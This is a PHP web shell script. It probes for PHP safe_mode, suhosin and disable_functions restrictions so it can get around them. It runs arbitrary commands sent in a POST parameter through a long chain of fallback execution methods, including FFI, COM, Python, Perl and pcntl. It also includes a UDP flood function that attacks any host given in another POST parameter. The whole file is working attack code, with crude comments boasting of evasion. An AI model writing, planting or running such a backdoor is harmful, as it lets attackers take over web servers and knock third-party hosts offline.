<?php 
function safemode() { // jacked from Syrian Shell
	$safe_mode = ini_get("safe_mode");
	if (!$safe_mode) {
		$safe_mode = 'off';
	}
    else {
		$safe_mode = 'on';  // ...fuck
	}
	return $safe_mode;
}

function suhosin_function_exists($func) { // makes sure we don't get cockblocked by suhosin's blacklist (which kills you if you run anything blacklisted)

        $safe=array('passthru','system','exec','shell_exec','popen','proc_open'); // If you use safe_mode, you are a bad person and you should feel bad. It won't really help you anyway.'
        $suhosin = @ini_get("suhosin.executor.func.blacklist");
        $dis = @ini_get("disable_functions");
        if (empty($suhosin) == false || empty($dis) == false) {
            $suhosin = explode(',', $suhosin);
            $suhosin = array_map('trim', $suhosin);
            $suhosin = array_map('strtolower', $suhosin);
            $dis = explode(',', $dis);
            $dis = array_map('trim', $dis); 
            $dis = array_map('strtolower', $dis);
            if(safemode() == "on" && in_array($func,$safe)) { return false; } // blacklisted by safemode?  
            if(in_array($func,$suhosin)) { return false; } // blacklisted in suhosin?
            if(in_array($func,$dis)) { return false; } // blacklisted in disable_functions?
            return function_exists($func); // does it exist otherwise?
	}
    return function_exists($func); 
} 
function scan_dir($path = '.') { // kungfu for open_basedir, recursively scan until we find a writable dir
	if(is_writable($path)) { return $path; } // why did you even call this?!
	$ignore = array('.', '..');
	$dh = @opendir($path);
	while(false !== ($file = readdir($dh))) {
		if(!in_array($file, $ignore)) { // make sure we arent backtracking
			if( is_dir( "$path/$file" ) ) {
				if(is_writable("$path/$file")) { closedir($dh); return "$path/$file"; } // fuck yeah we can write!
				else { return scan_dir("$path/$file"); } // this is gay, keep going	 
			}		
		}	
	} closedir($dh); return 0; // welp, we're boned.
}
function wheres_the_fucking_tmp_dir() {
	$tmp = sys_get_temp_dir();
	$uploadtmp=ini_get('upload_tmp_dir'); 
	$uf=getenv('USERPROFILE');
	$af=getenv('ALLUSERSPROFILE');
	$se=ini_get('session.save_path');
	$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
	if(is_dir($tmp) && is_writable($tmp)) $ret = $tmp; // we prefer this over open_basedir shit
	else if(is_dir('/tmp') && is_writable('/tmp')) $ret = '/tmp';
	else if(is_dir('/usr/tmp') && is_writable('/usr/tmp')) $ret = '/usr/tmp';
	else if(is_dir('/var/tmp') && is_writable('/var/tmp')) $ret = '/var/tmp';
	else if(is_dir($uploadtmp) && is_writable($uploadtmp)) $ret = $uploadtmp;
	else if(is_dir($uf) && is_writable($uf)) $ret = $uf;
	else if(is_dir($af) && is_writable($af)) $ret = $af;
	else if(is_dir($se) && is_writable($se)) $ret = $se;
	else if(is_dir($envtmp) && is_writable($envtmp)) $ret = $envtmp;
	else if(ini_get("open_basedir")) { $shit = scan_dir(ini_get("open_basedir")); if($shit) { $ret = $shit; } }
	else $ret = '.';
	
	return $ret;
} 
if (!suhosin_function_exists('file_put_contents')) {   // because php4 is old and gay and fail 
	function file_put_contents($file, $contents = '', $method = 'w') {     
		$file_handle = fopen($file, $method);     
		fwrite($file_handle, $contents);
		fclose($file_handle); 
		return true;
	}
     
}
function normal_exec($cmd) {  // Execute a command through "normal" methods
	$result = "";
	if (!empty($cmd)) { 
		if (suhosin_function_exists("exec")) {exec($cmd,$result); $result = join("\n",$result); } //play to the music
		elseif (suhosin_function_exists("shell_exec")) {$result = shell_exec($cmd);} //play to the music
		elseif (suhosin_function_exists("system")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}//play to the music
		elseif (suhosin_function_exists("passthru")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}//play to the music!
		elseif (suhosin_function_exists("popen")) { //play to the music!!
			if (is_resource($fp = popen($cmd,"r"))) { $result = ""; while(!feof($fp)) {$result .= fread($fp,1024);} pclose($fp); } }
            elseif (suhosin_function_exists("proc_open")) { //play to the music!!!
			$descriptorspec = array( 0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w") ) ; 
			$process = proc_open($cmd, $descriptorspec, $pipes, './');
			$result = stream_get_contents($pipes[1]);
			fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);
		}
	    elseif(extension_loaded('ffi'))$result=ffi_exec($cmd); // Windows exec bypass
		elseif(class_exists("COM")) { $result = com_exec($cmd); } // Windows exec bypass 2
		elseif(extension_loaded('python')) { $result =  python_eval("import os; os.system('$cmd')"); }
	    elseif(extension_loaded('perl')) { $result = perl_exec($cmd); }
		elseif (suhosin_function_exists("pcntl_exec") && suhosin_function_exists("pcntl_fork")) { // This is disabled in Debian's CGI PHP, dunno about CentOS. Very doubtful this will work.
			$tmpdir = wheres_the_fucking_tmp_dir();
			$pid = pcntl_fork(); // Fork
			if($pid == -1) { $result = ""; } // failed to fork, result is blank, you lose. 
			elseif($pid) { pcntl_wait($status); $result = file_get_contents("$tmpdir/fuhosin"); unlink("$tmpdir/fuhosin"); } // wait for output and return it
			else pcntl_exec("/bin/sh", array("-c","$cmd > $tmpdir/fuhosin")); // exec
		}
	} return $result;
} 

function ddos($host, $exec_time){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    $out = '';
    $time = time();
    echo "Started: ".time('d-m-y h:i:s')."<br>";
    $max_time = $time+$exec_time;
    
    for($i=0;$i<65000;$i++){
            $out .= 'h';
    }
    while(1){
    $packets++;
            if(time() > $max_time){
                    break;
            }
            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
            if($fp){
                    @fwrite($fp, $out); // $out is the bullshit we're sending, conn refused errors still send the data
                    fclose($fp);
            }
    }
}
if(isset($_POST["x"])) { ddos($_POST["x"],$_POST["y"]); }
else if(isset($_POST["z"]))  { echo normal_exec($_POST["z"]); }
?>

